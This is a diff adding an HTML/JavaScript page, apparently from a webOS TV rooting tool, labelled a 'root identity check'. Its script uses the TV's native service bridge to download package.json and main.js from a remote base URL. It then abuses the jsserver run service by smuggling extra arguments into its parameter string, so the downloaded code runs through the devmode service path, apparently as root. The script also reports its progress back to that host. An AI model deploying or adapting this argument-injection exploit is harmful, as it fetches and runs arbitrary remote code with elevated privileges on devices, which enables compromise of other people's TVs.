@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en"><meta charset="utf-8"><title>Reframe root identity check</title>
+<style>body{background:#101821;color:#eef3f8;font:28px sans-serif;padding:48px}pre{white-space:pre-wrap}</style>
+<h1>Reframe root identity check</h1><p>No installer, startup changes, or reboot.</p><pre id="status">Preparing...</pre>
+<script>
+(function () {
+  var baseUrl = __BASE_URL__;
+  var stageDir = __STAGE_DIR__;
+  var appId = __APP_ID__;
+  var bridges = [];
+  var closing = false;
+  function publish(event) {
+    document.getElementById('status').textContent = JSON.stringify(event, null, 2);
+    var request = new XMLHttpRequest();
+    request.open('POST', baseUrl + 'page', true);
+    request.setRequestHeader('Content-Type', 'application/json');
+    request.send(JSON.stringify(event));
+  }
+  function call(uri, params, subscription, done) {
+    var Constructor = window.PalmServiceBridge || window.webOSServiceBridge;
+    if (typeof Constructor !== 'function') { done(new Error('Native bridge unavailable')); return; }
+    var bridge = new Constructor();
+    bridges.push(bridge);
+    var completed = false;
+    var timer = setTimeout(function () { finish(new Error('Request timed out')); }, 12000);
+    function finish(error, response) {
+      if (completed) return;
+      completed = true;
+      clearTimeout(timer);
+      try { bridge.cancel(); } catch (ignore) {}
+      done(error, response);
+    }
+    bridge.onservicecallback = function (raw) {
+      var response;
+      try { response = JSON.parse(raw); }
+      catch (error) { finish(new Error('Malformed native reply')); return; }
+      if (!response || response.returnValue === false) {
+        finish(new Error(response && response.errorText || 'Native request failed')); return;
+      }
+      if (subscription) {
+        if (!Object.prototype.hasOwnProperty.call(response, 'completed')) return;
+        if (!response.completed || response.aborted || response.interrupted ||
+            !(response.httpStatus >= 200 && response.httpStatus < 300)) {
+          finish(new Error('Download did not complete successfully')); return;
+        }
+      } else if (response.returnValue !== true) {
+        finish(new Error('Service launch did not report success')); return;
+      }
+      finish(null, response);
+    };
+    try { bridge.call(uri, JSON.stringify(params)); }
+    catch (error) { finish(error); }
+  }
+  function closeProbe() {
+    if (closing) return;
+    closing = true;
+    call('luna://com.webos.applicationManager/closeByAppId', {id:appId}, false, function () {});
+    setTimeout(function () { window.close(); }, 500);
+  }
+  function failed(error) {
+    publish({phase:'failed', error:String(error)});
+    setTimeout(closeProbe, 1000);
+  }
+  function download(name, next) {
+    publish({phase:'download', file:name});
+    call('luna://com.webos.service.downloadmanager/download', {
+      target:baseUrl + name, targetDir:stageDir, targetFilename:name, subscribe:true
+    }, true, function (error, response) {
+      if (error) { failed(error); return; }
+      publish({phase:'downloaded', file:name, response:response});
+      next();
+    });
+  }
+  setTimeout(closeProbe, 35000);
+  publish({phase:'loaded'});
+  download('package.json', function () {
+    download('main.js', function () {
+      // Same reviewed service launch layout as pinned SlopBro; no shell payload.
+      var args = ['a', 'b', 'c', '/usr/palm/services/com.palm.service.devmode',
+        '--', '/tmp/run-js-service-no-cgroup', '^_~', stageDir, stageDir + '/uid-only-unused'];
+      publish({phase:'service-requested'});
+      call('luna://com.webos.service.jsserver/run', {inputParams:args.join(' ')}, false,
+        function (error, response) {
+          if (error) { failed(error); return; }
+          publish({phase:'service-reply', response:response});
+          setTimeout(closeProbe, 1000);
+        });
+    });
+  });
+})();
+</script></html>
